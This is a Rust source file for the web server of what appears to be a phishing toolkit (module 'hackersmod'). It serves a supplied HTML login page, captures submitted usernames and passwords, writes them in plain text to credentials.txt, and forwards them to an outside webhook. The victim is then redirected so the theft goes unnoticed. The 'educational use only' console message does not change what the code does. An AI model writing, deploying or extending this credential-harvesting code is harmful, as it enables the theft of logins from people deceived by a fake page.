// server.rs
use warp::Filter;
use std::sync::Arc;
use std::collections::HashMap;
use crate::modes::hackersmod::webhook;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::Local;

fn mask_sensitive(input: &str) -> String {
    if input.len() > 2 {
        let mut masked = String::with_capacity(input.len());
        masked.push(input.chars().next().unwrap());
        masked.extend(std::iter::repeat('*').take(input.len().saturating_sub(2)));
        masked.push(input.chars().last().unwrap());
        masked
    } else {
        "****".to_string()
    }
}

fn log_credentials(username: &str, password: &str) -> std::io::Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("credentials.txt")?;
        
    writeln!(
        file,
        "[{}] Username: {}, Password: {}",
        Local::now().format("%Y-%m-%d %H:%M:%S"),
        username,
        password
    )?;
    
    Ok(())
}
pub async fn start_server(
    html: String, 
    port: u16, 
    webhook_url: String
) -> Result<(), Box<dyn std::error::Error>> {
    let html = Arc::new(html);
    let webhook_url = Arc::new(webhook_url);

    // Login route - handles form submissions
    let login = warp::path!("login")
        .and(warp::post())
        .and(warp::body::form())
        .and(warp::any().map(move || webhook_url.clone()))
        .map(|form: HashMap<String, String>, url: Arc<String>| {
            if let (Some(username), Some(password)) = (form.get("username"), form.get("password")) {
                println!("[SECURITY ALERT] Login attempt captured (educational use only)");
                println!("Username: {}", mask_sensitive(username));
                println!("Password: {}", mask_sensitive(password));
                
                // Log real credentials to file
                if let Err(e) = log_credentials(username, password) {
                    eprintln!("Failed to log credentials: {}", e);
                }
                
                // Send to webhook if configured
                if !url.is_empty() {
                    webhook::send_creds(username, password, &url);
                }
            }
            warp::redirect::found(warp::http::Uri::from_static("/"))
        });

    // Index route - serves the HTML page
    let index = warp::any()
        .map(move || warp::reply::html(html.to_string()));

    let routes = login.or(index);

    // Try ports in range
    for try_port in port..port + 10 {
        match warp::serve(routes.clone())
            .try_bind_ephemeral(([0, 0, 0, 0], try_port)) 
        {
            Ok((addr, server)) => {
                println!("[SERVER] Running on http://0.0.0.0:{}", try_port);
                println!("[SERVER] Access at: http://localhost:{}", try_port);
                
                // This will block until CTRL+C is pressed
                let (_, server) = tokio::join!(
                    async {
                        tokio::signal::ctrl_c().await.ok();
                        println!("[SERVER] Shutting down");
                    },
                    server
                );
                
                return Ok(());
            },
            Err(e) => {
                eprintln!("[ERROR] Failed to bind to port {}: {}", try_port, e);
                if try_port == port + 9 {
                    return Err("Could not find available port in range".into());
                }
            },
        }
    }

    Err("Could not find available port in range".into())
}